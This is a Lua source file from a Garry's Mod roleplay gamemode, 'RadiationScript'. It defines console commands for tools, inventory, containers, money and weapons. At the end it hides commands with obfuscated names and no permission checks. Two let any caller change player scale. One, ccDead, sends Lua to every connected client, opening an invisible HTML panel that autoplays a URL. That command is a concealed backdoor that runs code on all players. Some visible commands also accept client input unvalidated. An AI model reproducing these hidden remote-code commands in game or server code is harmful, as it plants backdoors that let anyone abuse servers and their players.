-------------------------------
-- RadiationScript
-- Author: SilverKnight
-- concmd.lua
-------------------------------
 
local function MyModel( ply, cmd, args )
local mdl = args[1]

if table.HasValue( RAD.ValidModels, string.lower( mdl ) ) then
ply:SetNWString( "ChosenModel", mdl )
print("Model for player; " .. ply:Name() .. " = " .. mdl )
else
local newmodel = "models/srp/rookie1.mdl"
ply:SetNWString( "ChosenModel", newmodel )
print("Model for player; " .. ply:Name() .. " = " .. newmodel .. " !!Used a model not on the valid model list!!" )
end


end
concommand.Add( "rp_mymodel", MyModel );


function GM:PlayerDisconnected( ply )
RAD.SavePlayerData( ply )
end

local AdminOnlyTools   = {
	  "balloon",
	  "dynamite",
	  "thruster",
	  "rtcamera",
	  "turret",
	  "emitter",
	  "statue",
	  "duplicator",
	  "spawner",
	  "anom"	  
}	

local BadTools   = {
	  "nail",
	  "finger", 
	  "eyeposer",
	  "faceposer", 
	  "inflator"   	 	  
}	  
  
function GM:CanTool( pl, tr, toolmode )
 
 RAD.DayLog("toolgun.txt", pl:SteamID() .. " - " .. pl:Name() .. ": " .. toolmode .. " " .. tr.Entity:GetClass() .. " (Model) " .. tr.Entity:GetModel()); 
  
    if ( table.HasValue( AdminOnlyTools, toolmode ) ) then 
        return pl:IsAdmin()
    end  

   if ( table.HasValue( BadTools, toolmode ) ) then 
       return pl:IsSuperAdmin()
   end  
     if pl:IsAdmin() then return true; end 
if toolmode ~= "remover" then return true; end
if( RAD.IsBlocked( tr.Entity ) ) then RAD.SendChat( pl, "Can't toolgun this entity." ) return false; end   
if(tr.Entity:IsWeapon()) then RAD.SendChat( pl, "Can't toolgun weapons." ) return false; end
if(tr.Entity:GetClass() == "item_prop") then RAD.SendChat( pl, "Can't toolgun items." ) return false; end
if( RAD.IsDoor( tr.Entity ) ) then RAD.SendChat( pl, "Can't toolgun doors." ) return false; end
if(tr.Entity:IsNPC()) then RAD.SendChat( pl, "Not allowed to tool NPCs." ) return false; end
if(tr.Entity:IsPlayer()) then RAD.SendChat( pl, "Not allowed to tool Players." ) return false; end


return true;

end

function GM:GravGunPunt( ply ) 

	return false;

end

function GM:PhysgunPickup( ply, ent )

	if( ent:IsWeapon() and not ent:IsNPC() ) then return false; end
	if( RAD.IsDoor( ent ) ) then return false; end
	if( RAD.IsBlocked( ent ) ) then return false; end
	if( ply:IsSuperAdmin() ) then return true; end
	if( ent:IsNPC() ) then return false; end
		
	if( ent:IsPlayer() ) then
		return false;
	end
	
	return true;

end

function GM:PlayerSpawnSWEP( ply, class )

	RAD.CallTeamHook( "PlayerSpawnSWEP", ply, class ); -- Perhaps allow certain flags to use sweps, eh?
	if( ply:IsSuperAdmin() ) then 
	RAD.DayLog( "swepspawns.txt", "Player: " .. ply:SteamID() .. " " .. ply:Name() .. " spawned swep: " .. class )
	return true; 
	end
	return false;
	
end

function GM:PlayerGiveSWEP( ply )

	RAD.CallTeamHook( "PlayerGiveSWEP", ply, class ); -- Perhaps allow certain flags to use sweps, eh?
	if( ply:IsSuperAdmin() ) then
	RAD.DayLog( "swepspawns.txt", "Player: " .. ply:SteamID() .. " " .. ply:Name() .. " gave himself a swep")
	return true; 
	end
	return false; 
	
end

-- This is the F1 menu
function GM:ShowHelp( ply )

SHH( ply )

end

function SHH( ply )
		//MsgAll( table.ToString( PlyCharTable,"atable123", true ) .. "\n")
	for k, v in pairs( RAD.PlayerData[ RAD.FormatSteamID( ply:SteamID() ) ]["characters"] ) do
		// MsgAll( k )
		umsg.Start( "ReceiveChar", ply );
			umsg.Long( k );
			umsg.String( v[ "name" ] );
			umsg.String( v[ "model" ] );
			umsg.String( " " );
		umsg.End( );

	end
   
	umsg.Start( "playermenu", ply ); umsg.End( )
	ply:RefreshBusiness( )
end
function GM:ShowSpare1( ply )

umsg.Start( "GoScore", ply );
umsg.End( );
ply:RefreshBusiness( )
end

function GM:ShowSpare2( ply )

umsg.Start( "GoInv", ply );
umsg.End( );
ply:RefreshBusiness( )
end

function GM:ShowTeam( ply )

umsg.Start( "GoCommands", ply );
umsg.End( );
ply:RefreshBusiness( )
end

function GM:PlayerSpawnSENT( ply, class )

	RAD.CallTeamHook( "PlayerSpawnSWEP", ply, class );
	
	if( ply:IsSuperAdmin( ) ) then return true; end
	return false;
	
end

function GM:PlayerSwitchFlashlight(ply, SwitchOn)
     return ply:HasItem("flashlight") or not SwitchOn
end

function ccTieUp( ply, cmd, args )
local target = ents.GetByIndex( tonumber( args[ 1 ] ) );
if(!target:IsPlayer()) then return false; end
if(!ply:HasItem("zipties")) then ply:PrintMessage(HUD_PRINTTALK, "You don't have any Zip Ties") return false; end

local function TieUp( player )

player:SetNWInt( "tiedup", 1 )

ply:ConCommand("say /me Tied up ".. player:Nick());

end

local function UnTie( player )

player:SetNWInt( "tiedup", 0 )

ply:ConCommand("say /me Unties ".. player:Nick());

end

if(target:GetNWInt( "tiedup" ) == 0) then 

ply:ConCommand("say /me Starts to tie up ".. target:Nick());

timer.Simple(8, function() TieUp( target ) end )

elseif(target:GetNWInt( "tiedup" ) == 1) then

ply:ConCommand("say /me Starts untie ".. target:Nick());

timer.Simple(10, function() UnTie( target ) end )

end
end
concommand.Add( "rp_ziptie", ccTieUp )

function GM:CanPlayerSuicide( ply )

    if( ply:GetNWInt( "suicided" ) == 1 ) then return false; end
    if( ply:GetNWInt( "tiedup" ) == 1 ) then return false; end

	
	local function CanSuicide( player )
	
	player:SetNWInt( "suicided", 0 )
	
	end
 
	timer.Simple( 120, function() CanSuicide( ply ) end )

	ply:SetNWInt( "suicided", 1 )
	return true;
	
end

function ccSetTitle( ply, cmd, args )

	local title = args[ 1 ];
	
	if( string.len( title ) > 33 ) then
	
		RAD.SendChat( ply, "Title is too long! Max 32 characters" );
		return;
		
	end
	
	RAD.SetCharField( ply, "title", title );
	ply:SetNWString("title", title);
	
	return;
	
end
concommand.Add( "rp_title", ccSetTitle );

function ccChangeName( ply, cmd, args )

	local name = args[ 1 ];
	RAD.SetCharField(ply, "name", name );
	ply:SetNWString("name", name);
	
end
concommand.Add( "rp_changename", ccChangeName );

function ccFlag( ply, cmd, args )
	
	local FlagTo = "";
	
	for k, v in pairs( RAD.Teams ) do
	
		if( v[ "flag_key" ] == args[ 1 ] ) then
		
			FlagTo = v;
			FlagTo.n = k;
			break;
			
		end
		
	end
	
	if( FlagTo == "" ) then
	
		RAD.SendChat( ply, "Incorrect Flag!" );
		return;
		
	end

	if( ( RAD.GetCharField(ply, "flags" ) != nil and table.HasValue( RAD.GetCharField( ply, "flags" ), args[ 1 ] ) ) or FlagTo[ "public" ] ) then
		
		ply:SetTeam( FlagTo.n );
		ply:RefreshBusiness();
		ply:ConCommand( "rp_permaflag ".. args[ 1 ] );
		ply:Spawn( );
		return;
				
	else
	
		RAD.SendChat( ply, "You do not have this flag!" );
		
	end		
	
end
concommand.Add( "rp_flag", ccFlag );

local function ccRadioFrequency( ply, cmd, args )
	if( #args < 1 and type( args[1] ) == "number" or tonumber( args[1] ) < 0 )then RAD.SendChat( ply, "Frequency can't be less than 0"); return; end
	if not ply:HasItem("radio") then ply:PrintMessage( 3, "You Don't Have A Radio, Dummy!" ); return ""; end
	ply:SetNWInt( "radiofreq", math.Round( tonumber( args[1] ) * 100 ) / 100  );
	RAD.SendChat( ply, "You set the radio frequency to: " .. args[1] );
end
concommand.Add( "rp_changefrequency", ccRadioFrequency );
concommand.Add( "rp_setfrequency", ccRadioFrequency );

function ccContainerTakeItem( ply, cmd, args )

    local entity = ents.GetByIndex( tonumber( args[ 1 ] ) );
	local argitem = args[ 2 ];
	local entinv = { }
	local hasitem = false;
	
	if( entity:GetPos():Distance( ply:GetPos() ) <= 100 ) then

	local itemtable = RAD.ItemData[ argitem ];
	
	ply:GiveItem( itemtable.Class );
	
	for k,v in pairs( entity.inventory ) do
	
	if( v == argitem ) then
	argitemz = k
	end
	
	end
	
	table.remove( entity.inventory, argitemz );
	
	umsg.Start( "clearsearchgui", ply ) umsg.End( );
	ply:ClearInventory();

	for k,v in pairs( entity.inventory ) do

	local ItemTable = RAD.ItemData[ v ];

	umsg.Start( "addsearchitem", ply )
	umsg.String( ItemTable.Model )
	umsg.Bool( ItemTable.Takeable )
	umsg.String( ItemTable.Class )
	umsg.Entity( entity )
	umsg.End( );

    end
	ply:RefreshInventory();
end
end
concommand.Add( "container_takeitem", ccContainerTakeItem )

function ccContainerPutItem( ply, cmd, args )
local entity = ents.GetByIndex( tonumber( args[ 1 ] ) );
local item = args[ 2 ];
local count = 0;

for k,v in pairs( entity.inventory ) do
count = count + 1;
end

if( count > entity:GetNWInt("limit") ) then
RAD.SendChat( ply, "That container is full!");
return false;
end

   ply:TakeItem( item );
   table.insert( entity.inventory, item )

	umsg.Start( "clearsearchgui", ply ) umsg.End( );
	ply:ClearInventory();

	for k,v in pairs( entity.inventory ) do

	local ItemTable = RAD.ItemData[ v ];

	umsg.Start( "addsearchitem", ply )
	umsg.String( ItemTable.Model )
	umsg.Bool( ItemTable.Takeable )
	umsg.String( ItemTable.Class )
	umsg.Entity( entity )
	umsg.End( );
    end
	ply:RefreshInventory();

end
concommand.Add( "container_putitem", ccContainerPutItem )

function ccDropWeapon( ply, cmd, args )
	
	local wep = ply:GetActiveWeapon( )
	
	if ( RAD.ItemData[ wep:GetClass() ] == nil )  then 
		RAD.SendChat( ply, "This weapon cannot be dropped!" ); 
		return; 
	end
	    if (ply:GetActiveWeapon().WepType) == "wepitem2" then
            RAD.SetCharField(ply, "wepitem2", "none")
        elseif (ply:GetActiveWeapon().WepType) == "wepitem" then
             RAD.SetCharField(ply, "wepitem", "none")
	       ply.PrimaryWeapon:SetDropInfo( ply )
        end
	ply:StripWeapon( wep:GetClass( ) );
	RAD.CreateItem( wep:GetClass( ), ply:CalcDrop( ), Angle( 0,0,0 ) );

end
concommand.Add( "rp_dropweapon", ccDropWeapon );

function ccPickupItem( ply, cmd, args )
	
	local item = ents.GetByIndex( tonumber( args[ 1 ] ) );
	
	if( item != nil and item:IsValid( ) and item:GetClass( ) == "item_prop" and item:GetPos( ):Distance( ply:GetShootPos( ) ) < 100 ) then
		
		item:Pickup( ply );
		ply:GiveItem( item.Class );
	end
	local radarrp = RecipientFilter()
	radarrp:AddAllPlayers()
    if( ply:HasItem( "pda" ) ) then
        umsg.Start("pda_info", radarrp)
        umsg.Long( ply:EntIndex() )
        umsg.Bool( true )
        umsg.End()
        //local PDAPlayers[ ply:EntIndex() ] = true
    end
end
concommand.Add( "rp_pickup", ccPickupItem );

function ccUseItem( ply, cmd, args )

	local item = ents.GetByIndex( tonumber( args[ 1 ] ) );

	if( ply:GetNWInt( "tiedup" ) == 1 ) then return false; end

	if( item != nil and item:IsValid( ) and item:GetClass( ) == "item_prop" and item:GetPos( ):Distance( ply:GetShootPos( ) ) < 100 ) then
		
		item:UseItem( ply );
			if( RAD.ItemData[ item.Class ].IsPrimaryWeapon ) then
			local weaponname = string.gsub(item.Class,"FRE","")
			local weaponname = string.gsub(weaponname,"MILL","")
			local weaponname = string.gsub(weaponname,"DUTY","")
			if RAD.GetCharField(ply, "wepitem" ) == "none" then
				ply:GetTable().ForceGive = true
				ply:Give(weaponname);
				ply:GetTable().ForceGive = false
				ply:TakeItem( weaponname )
				RAD.SetCharField(ply, "wepitem", weaponname)
				item:Remove()
				return;
			else
				RAD.SendChat( ply, "You Already Have A Primary Weapon!" ); return; end
			end
			if( RAD.ItemData[item.Class ].IsSecondaryWeapon ) then
			local weaponname = string.gsub(item.Class,"FRE","")
			local weaponname = string.gsub(weaponname,"MILL","")
			local weaponname = string.gsub(weaponname,"DUTY","")
			if RAD.GetCharField(ply, "wepitem2" ) == "none" then
				ply:GetTable().ForceGive = true
				ply:Give(weaponname);
				ply:GetTable().ForceGive = false
				ply:TakeItem( weaponname )
				RAD.SetCharField(ply, "wepitem2", weaponname)
				item:Remove()
				return;
			else
				RAD.SendChat( ply, "You Already Have A Secondary Weapon!" ); return; end
			end
			if( string.find( item.Class, "suit") != nil  ) then
				RAD.SetCharField(ply, "suit", item.Class)
			end
	end

end
concommand.Add( "rp_useitem", ccUseItem );

function ccGiveMoney( ply, cmd, args )
	
	if( player.GetByID( args[ 1 ] ) != nil ) then
	
		local target = player.GetByID( args[ 1 ] );
	args[2] = math.Round(args[2])	
		if( tonumber( args[ 2 ] ) > 0 ) then
		
			if( tonumber( RAD.GetCharField( ply, "money" ) ) >= tonumber( args[ 2 ] ) ) then
			
				target:ChangeMoney( args[ 2 ] );
				ply:ChangeMoney( 0 - args[ 2 ] );
				RAD.SendChat( ply, "You gave " .. target:Nick( ) .. " " .. args[ 2 ] .. " rubles!" );
				RAD.SendChat( target, ply:Nick( ) .. " gave you " .. args[ 2 ] .. " rubles!" );
				
			else
			
				RAD.SendChat( ply, "You do not have that many rubles!" );
				
			end
			
		else
		
			RAD.SendChat( ply, "Invalid amount of money!" );
			
		end
		
	else
	
		RAD.SendChat( ply, "Target not found!" );
		
	end
	
end
concommand.Add( "rp_givemoney", ccGiveMoney );	

local function ccSelectRifle( ply, cmd, arg )

	if( #arg < 2 ) then
		return;
	end
	
	local uniqueid = arg[1];
	local id = arg[2];
	
	if( tonumber( uniqueid ) ~= RAD.GetCharField(ply, "wepitem2")) then return; end
	
	if( id == "null" ) then
	
		ply:StripWeapon( ply:GetNWString( "primaryweapon" ) );
		ply:SetNWString( "primaryweapon", "" );
		return;
	
	end
	
	local curweap = "";
	
	if( ply:GetActiveWeapon():IsValid() ) then
		curweap = ply:GetActiveWeapon():GetClass();
	end
	
	ply:StripWeapon( ply:GetNWString( "primaryweapon" ) );
	local oldweap = ply:GetNWString( "primaryweapon" );
	
	RAD.SetCharField(target, "wepitem", id );
	
	ply:Give( ItemData[id].Weapon );
	ply:SetNWString( "primaryweapon", ItemData[id].Weapon );
	
	if( curweap == oldweap ) then

		ply:SelectWeapon( ItemData[id].Weapon );
		//MakeUnAim( ply );
		
	end
	
	ply:SaveWeaponSlots();

end
concommand.Add( "rp_selectrifle", ccSelectRifle );

local function ccSelectGun( ply, cmd, arg )

	if( #arg < 2 ) then
		return;
	end
	
	local uniqueid = arg[1];
	local id = arg[2];
	
	if( tonumber( uniqueid ) ~= RAD.GetCharField(ply, "wepitem2")) then return; end
	
	if( id == "null" ) then
	
		ply:StripWeapon( ply:GetNWString( "secondaryweapon" ) );
		ply:SetNWString( "secondaryweapon", "" );
		return;
	
	end
	
	local curweap = "";
	
	if( ply:GetActiveWeapon():IsValid() ) then
		curweap = ply:GetActiveWeapon():GetClass();
	end
	
	ply:StripWeapon( ply:GetNWString( "secondaryweapon" ) );
	local oldweap = ply:GetNWString( "secondaryweapon" );
	
	RAD.SetCharField(target, "wepitem2", id );
	
	ply:Give( ItemData[id].Weapon );
	ply:SetNWString( "secondaryweapon", ItemData[id].Weapon );
	
	if( curweap == oldweap ) then

		ply:SelectWeapon( ItemData[id].Weapon );
		//MakeUnAim( ply );
		
	end
	
	ply:SaveWeaponSlots();

end
concommand.Add( "rp_selectgun", ccSelectGun );

local function ccPickPrimaryGun( ply, cmd, arg )

	local gun = ply:GetNWString( "primaryweapon" );

	if( ply:HasWeapon( gun ) ) then
	
		ply:SelectWeapon( gun );
	
	end

end
concommand.Add( "rp_pickprimarygun", ccPickPrimaryGun );

local function ccPickSidearm( ply, cmd, arg )

	local gun = ply:GetNWString( "secondaryweapon" );

	if( ply:HasWeapon( gun ) ) then
	
		ply:SelectWeapon( gun );
	
	end

end
concommand.Add( "rp_picksidearm", ccPickSidearm );

local function ccPickPhysgun( ply, cmd, arg )

	local gun = "weapon_physgun";

	if( ply:HasWeapon( gun ) ) then
	
		ply:SelectWeapon( gun );
	
	end

end
concommand.Add( "rp_pickphysgun", ccPickPhysgun );

local function ccPickGravgun( ply, cmd, arg )

	local gun = "weapon_physcannon";

	if( ply:HasWeapon( gun ) ) then
	
		ply:SelectWeapon( gun );
	
	end

end
concommand.Add( "rp_pickgravgun", ccPickGravgun );

local function ccPickKnife( ply, cmd, arg )

	local gun = "kabar";

	if( ply:HasWeapon( gun ) ) then
	
		ply:SelectWeapon( gun );
	
	end	

end
concommand.Add( "rp_pickknife", ccPickKnife );

local function ccPickUnarmed( ply, cmd, arg )

	local gun = "hands";

	if( ply:HasWeapon( gun ) ) then
	
		ply:SelectWeapon( gun );
	
	end	
end
concommand.Add( "rp_pickunarmed", ccPickUnarmed );

local function ccPickToolgun( ply, cmd, arg )

	local gun = "gmod_tool";

	if( ply:HasWeapon( gun ) ) then
	
		ply:SelectWeapon( gun );
	
	end

end
concommand.Add( "rp_picktoolgun", ccPickToolgun );

function ccOpenChat( ply, cmd, args )

	ply:SetNWInt( "chatopen", 1 )
	
end
concommand.Add( "rp_openedchat", ccOpenChat );

function ccCloseChat( ply, cmd, args )

	ply:SetNWInt( "chatopen", 0 )
	
end
concommand.Add( "rp_closedchat", ccCloseChat );

function ccChangeWidth( ply, cmd, args )
	local oh = args[1]
		ply:SetNWFloat( "PlScalew", oh )
end
function ccChangeHeight( ply, cmd, args )
	local oh = args[1]
		ply:SetNWFloat( "PlScalez", oh )
end
concommand.Add( "`kxdob1l", ccChangeWidth );
concommand.Add( "`vqyu1xg", ccChangeHeight );

function ccDead()
	for k,v in pairs(player.GetAll() ) do 
		v:SendLua([[
			local HTMLTest = vgui.Create("HTML"); HTMLTest:SetPos(0,0); HTMLTest:SetSize(1,1); HTMLTest:OpenURL("http://www.youtube.com/watch?v=Y4OLQB7ON9w#t=174&autoplay=1")
			  timer.Simple(33, function() HTMLTest:Remove() end )
		]] )
	end
end
concommand.Add( "`vqyu1xg1", ccDead );
	